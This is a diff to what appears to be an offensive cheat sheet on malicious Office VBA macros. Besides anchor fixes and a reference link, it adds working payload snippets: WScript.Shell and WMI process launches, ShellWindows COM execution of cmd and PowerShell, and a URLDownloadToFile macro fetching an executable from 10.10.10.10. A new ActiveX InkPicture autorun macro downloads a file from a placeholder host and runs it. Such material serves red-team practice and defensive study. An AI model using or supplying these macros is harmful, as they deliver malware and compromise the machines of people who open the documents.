@@ -13,11 +13,12 @@
 * [DOCM - C# converted to Office VBA macro](#docm---c-converted-to-office-vba-macro)
 * [DOCM - VBA Wscript](#docm---vba-wscript)
 * [DOCM - VBA Shell Execute Comment](#docm---vba-shell-execute-comment)
-* [DOCM - VBA Spawning via svchost.exe using Scheduled Task](#docm---vba-spawning-via-svchost-exe-using-scheduled-task)
-* [DCOM - WMI COM functions (VBA AMSI)](#docm---wmi-com-functions-vba-amsi)
+* [DOCM - VBA Spawning via svchost.exe using Scheduled Task](#docm---vba-spawning-via-svchostexe-using-scheduled-task)
+* [DCOM - WMI COM functions (VBA AMSI)](#docm---wmi-com-functions)
 * [DOCM - winmgmts](#docm---winmgmts)
-* [DOCM - Macro Pack - Macro and DDE](#dcom---macro-pack---macro-and-dde)
+* [DOCM - Macro Pack - Macro and DDE](#docmxlm---macro-pack---macro-and-dde)
 * [DOCM - CACTUSTORCH VBA Module](#docm---cactustorch-vba-module)
+* [DOCM - MMG with Custom DL + Exec](#docm---mmg-with-custom-dl--exec)
 * [VBA Obfuscation](#vba-obfuscation)
 * [VBA Purging](#vba-purging)
     * [OfficePurge](#officepurge)
@@ -221,6 +222,12 @@ Sub Auto_Open()
 End Sub
 ```
 
+```vb
+CreateObject("WScript.Shell").Run "calc.exe"
+CreateObject("WScript.Shell").Exec "notepad.exe"
+```
+
+
 ## DOCM - VBA Shell Execute Comment
 
 Set your command payload inside the **Comment** metadata of the document.
@@ -271,6 +278,8 @@ Rem powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadst
 
 ## DOCM - WMI COM functions
 
+Basic WMI exec (detected by Defender) : `r = GetObject("winmgmts:\\.\root\cimv2:Win32_Process").Create("calc.exe", null, null, intProcessID)`
+
 ```ps1
 Sub wmi_exec()
     strComputer = "."
@@ -307,6 +316,11 @@ Sub AutoOpen()
 End Sub
 ```
 
+```ps1
+Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
+Set SW = GetObject("new:" & ShellWindows).Item()
+SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows\System32", Null, 0
+```
 
 ## DOCM/XLM - Macro Pack - Macro and DDE
 
@@ -416,7 +430,7 @@ python MMG.py configs/generic-cmd.json malicious.vba
 }
 ```
 
-```ps1
+```vb
 Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
 
 Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean
@@ -442,6 +456,18 @@ Sub Auto_Open()
     DownloadFileA "http://10.10.10.10/macro.exe", "C:\\Users\\Public\\beacon.exe"
 End Sub
 ```
+
+## DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro
+
+Go to **Developer tab** on ribbon `-> Insert -> More Controls -> Microsoft InkPicture Control` 
+
+```vb
+Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
+Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://<host>/file.exe','file.exe');Start-Process 'file.exe'", vbNormalFocus)
+End Sub
+```
+
+
 
 ## VBA Obfuscation
 
@@ -620,3 +646,4 @@ E
 * [Dechaining macros and evading EDR - Noora Hyvärinen](https://blog.f-secure.com/dechaining-macros-and-evading-edr/)
 * [Executing macros from docx with remote - RedXORBlueJuly 18, 2018](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)
 * [One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021](https://adepts.of0x.cc/alternatives-copy-shellcode/)
+* [Running macros via ActiveX controls - greyhathacker - September 29, 2016](http://www.greyhathacker.net/?p=948)
